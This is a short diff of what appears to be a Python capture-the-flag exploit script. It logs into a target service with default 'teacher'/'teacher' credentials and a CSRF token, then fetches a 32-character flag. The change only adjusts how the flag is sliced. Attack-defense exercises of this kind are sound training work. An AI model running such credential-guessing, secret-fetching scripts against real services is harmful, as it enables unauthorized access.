@@ -50,7 +50,7 @@ def shit(target,target_port):
     s.post(url_2,data={'_username':'teacher','_password':'teacher','_csrf_token':'%s'%token}).content
     
     s.get(url_3)
-    flag =  s.get(url_4).content
+    flag =  s.get(url_4).content[3:]
     if len(flag)==32:
         debug_print(flag)
     else:
